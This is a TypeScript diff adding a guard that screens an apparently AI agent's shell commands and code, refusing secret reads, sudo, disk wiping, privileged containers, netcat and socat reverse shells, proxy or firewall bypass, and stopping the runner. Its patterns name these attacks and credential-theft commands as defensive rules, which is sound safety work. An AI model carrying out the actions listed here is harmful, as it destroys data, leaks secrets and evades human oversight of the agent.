+      /^\/(home|Users)\/[^/]+$/.test(r) ||
+      (scope.home !== undefined && r === path.resolve(scope.home)))
+  );
+}
+
+/** `find`'s starting points: its words before the first test or action. */
+const findRoots = (args: readonly string[]) => {
+  const end = args.findIndex((a) => /^[-(!]/.test(a) && !/^-[HLP]$/.test(a));
+  return args.slice(0, end < 0 ? args.length : end).filter((a) => !/^-[HLP]$/.test(a));
+};
+
+/** A container given the host: `--privileged`, the host's namespaces or admin capabilities, `/` or Docker's socket mounted. */
+function hostAccess(args: readonly string[], scope: CommandScope) {
+  return args.some((a, i) => {
+    const next = args[i + 1] ?? "";
+    if (
+      /^--privileged$|^--(pid|ipc|userns|uts|cgroupns)=host$|^--cap-add=(ALL|SYS_ADMIN|SYS_MODULE|SYS_PTRACE)$/i.test(a)
+    )
+      return true;
+    if (/^--(pid|ipc|userns|uts|cgroupns)$/.test(a) && next === "host") return true;
+    if (a === "--cap-add" && /^(ALL|SYS_ADMIN|SYS_MODULE|SYS_PTRACE)$/i.test(next)) return true;
+    const mount =
+      a === "-v" || a === "--volume"
+        ? next.split(":")[0]
+        : /^(-v|--volume=)/.test(a)
+          ? a.replace(/^(-v|--volume=)/, "").split(":")[0]
+          : a === "--mount" || a.startsWith("--mount=")
+            ? /(?:^|,)(?:source|src)=([^,]+)/.exec(a === "--mount" ? next : a.slice(8))?.[1]
+            : undefined;
+    if (!mount) return false;
+    const r = resolveIn(scope, mount);
+    return r === "/" || /docker\.sock$|podman\.sock$/.test(mount);
+  });
+}
+
+function commandProblem(s: Loose, scope: CommandScope): string | null {
+  const [first = "", ...args] = s.argv;
+  const cmd = baseName(first);
+  if (PRIVILEGE.test(cmd)) return PRIVILEGE_REASON;
+  if (WIPE_TOOLS.test(cmd)) return WIPE;
+  if (cmd === "dd" && args.some((a) => /^of=\/dev\/(?!(null|zero|stdout|stderr|shm)(\/|$))/.test(a))) return WIPE;
+  if (cmd === "diskutil" && /^(erase\w*|reformat|partitionDisk|zeroDisk|randomDisk|secureErase)$/i.test(args[0] ?? ""))
+    return WIPE;
+  const recursive = args.some((a) => /^-[a-zA-Z]*[rR]/.test(a) || a === "--recursive");
+  if (
+    args.includes("--no-preserve-root") ||
+    (/^(rm|chmod|chown|chgrp)$/.test(cmd) && recursive && args.some((a) => !a.startsWith("-") && wholeTree(a, scope)))
+  )
+    return WIPE;
+  if (cmd === "find" && args.includes("-delete") && findRoots(args).some((a) => wholeTree(a, scope))) return WIPE;
+  const plain = args.filter((a) => !a.startsWith("-"));
+  if (
+    (cmd === "mv" && plain.slice(0, -1).some((a) => wholeTree(a, scope))) ||
+    (cmd === "rsync" && args.some((a) => a.startsWith("--delete")) && wholeTree(plain.at(-1) ?? "", scope))
+  )
+    return WIPE;
+  if (/^(docker|podman)$/.test(cmd) && args.some((a) => a === "run" || a === "create") && hostAccess(args, scope))
+    return PRIVILEGE_REASON;
+  if (
+    (cmd === "security" &&
+      (/^(dump-keychain|export)$/.test(args[0] ?? "") ||
+        (/^find-(generic|internet)-password$/.test(args[0] ?? "") && args.some((a) => /^-[a-zA-Z]*[wg]/.test(a))))) ||
+    (cmd === "git" && args.includes("credential") && args.includes("fill")) ||
+    ((/^(git|docker)-credential-/.test(cmd) || (cmd === "git" && args.some((a) => a.startsWith("credential-")))) &&
+      args.includes("get"))
+  )
+    return SECRETS;
+  // The runner by name: stopped or killed (a search for the name, `pgrep` and a status are not).
+  if (
+    args.some((a) => /agentes-runner/i.test(a)) &&
+    (/^(pkill|killall)$/.test(cmd) ||
+      (cmd === "systemctl" && args.some((a) => SYSTEMCTL_CHANGES.test(a))) ||
+      (cmd === "service" && args.some((a) => /^(stop|restart|reload)$/.test(a))) ||
+      (cmd === "launchctl" && args.some((a) => /^(bootout|unload|stop|kill|remove|disable)$/.test(a))))
+  )
+    return RUNNER;
+  if (/^(nc|ncat|netcat)$/.test(cmd) && args.some((a) => /^-[a-zA-Z]*[ec]|^--(exec|sh-exec|lua-exec)/.test(a)))
+    return REVERSE;
+  if (cmd === "socat" && args.some((a) => /(^|[,!])(exec|system):/i.test(a))) return REVERSE;
+  if (SYSTEM_TOOLS.test(cmd)) return SYSTEM_REASON;
+  if (cmd === "systemctl" && !args.includes("--user") && args.some((a) => SYSTEMCTL_CHANGES.test(a)))
+    return SYSTEM_REASON;
+  if (cmd === "service" && args.some((a) => /^(start|stop|restart|reload|force-reload)$/.test(a))) return SYSTEM_REASON;
+  if (cmd === "sysctl" && args.some((a) => /^(-w|-p|--write|--load|--system)$/.test(a) || /^[\w.]+=/.test(a)))
+    return SYSTEM_REASON;
+  if (cmd === "launchctl" && args.some((a) => /^system(\/|$)/.test(a) || a.startsWith("/Library/")))
+    return SYSTEM_REASON;
+  if (cmd === "git" && args.includes("--system")) return SYSTEM_REASON;
+  if (FIREWALL_TOOLS.test(cmd)) return NETWORK;
+  if (
+    (cmd === "ip" || cmd === "route") &&
+    args.some((a) => /^(add|del|delete|change|replace|flush|set|append)$/.test(a))
+  )
+    return NETWORK;
+  if (
+    cmd === "curl" &&
+    args.some((a) =>
+      /^(-x|--proxy|--noproxy|--preproxy|--socks4a?|--socks5(-hostname)?)$|^--(proxy|noproxy|preproxy|socks\w*)=/.test(
+        a,
+      ),
+    )
+  )
+    return NETWORK;
+  if (cmd === "wget" && args.some((a) => a === "--no-proxy" || /^(use_proxy|https?_proxy|no_proxy)=/i.test(a)))
+    return NETWORK;
+  if (cmd === "git" && args.some((a) => /^https?\.(\S+\.)?proxy(=|$)/i.test(a))) return NETWORK;
+  const written = writeTargets(cmd, args, s.writes);
+  for (const file of written) {
+    const why = writeProblem(file, scope);
+    if (why) return why;
+  }
+  const keys = new Set(s.argv.filter((_, i) => i > 0 && sshKeyArg(s.argv, i)));
+  for (const word of [...s.raw, ...s.reads]) {
+    if (written.includes(word) || keys.has(word)) continue;
+    const why = wordProblem(word, scope);
+    if (why) return why;
+  }
+  return null;
+}
+
+/** `badActorReason` for a text: a shell command (`code` false) or Python/JavaScript code. */
+function badText(text: string, code: boolean, scope: CommandScope): string | null {
+  const flat = text.replace(/\\\r?\n/g, " ");
+  if (REVERSE_SHELL.some((all) => all.every((r) => r.test(flat)))) return REVERSE;
+  if (FORK_BOMB.test(flat)) return WIPE;
+  if (PROXY_TEXT.some((r) => r.test(flat)) || proxyBypass(flat)) return NETWORK;
+  if (RUNNER_VARIABLE.test(flat)) return RUNNER;
+  if (ENCODED_RUN.some((all) => all.every((r) => r.test(flat)))) return ENCODED;
+  if (code && ENV_DUMP_CODE.test(flat) && NET_CODE.test(flat)) return ENV_OUT;
+  const cmds: Loose[] = [];
+  looseScan(flat, code, 0, cmds);
+  let dumps = false;
+  let sends = false;
+  for (const s of cmds) {
+    const why = commandProblem(s, scope);
+    if (why) return why;
+    dumps ||= envDump(s.raw);
+    sends ||= SENDERS.test(baseName(s.argv[0] ?? ""));
+  }
+  return dumps && sends ? ENV_OUT : null;
+}
+
+/**
+ * Why a call of a run outside a mission is refused (ADR 0053 §3, addendum 2026-11-19), or null: it runs. Only
+ * obvious harm: secrets read, printed or sent; more rights (sudo, su); changes to the system, its services, disks
+ * and kernel; a shell handed to another machine; wiping the computer or a home; the proxy, firewall or routes
+ * changed or gone around; the runner; another user's files. Everything else is ordinary work: HTTP calls of any
+ * method, ssh and rsync, pushes, pipes, heredocs, `$(…)`, `bash -c`, inline code, installs into the agent's own
+ * user. The whole text is read, so a `bash -c`, a heredoc or inline code hides nothing that plain matching can see.
+ */
+export function badActorReason(
+  toolName: string,
+  input: Record<string, unknown> | null | undefined,
+  scope: CommandScope,
+): string | null {
+  const file = FILE_WRITE_TOOLS.has(toolName)
+    ? [input?.file_path, input?.notebook_path].find((v): v is string => typeof v === "string")
+    : undefined;
+  if (file !== undefined) return namesSecret(file, scope) ? SECRETS : writeProblem(file, scope);
+  if (toolName !== "Bash") return null;
+  return badText(typeof input?.command === "string" ? input.command : "", false, scope);
+}
+
+/** `badActorReason` for `run_code`'s code (`language`: bash, python or node), where the computer's folders aren't known. */
+export const badActorCode = (code: string, language: string) =>
+  badText(code, language !== "bash", { cwd: "/nonexistent", folders: [] });
 
 // ── "Aprovar sempre" for a command: its kind ──────────────────────────────────
 
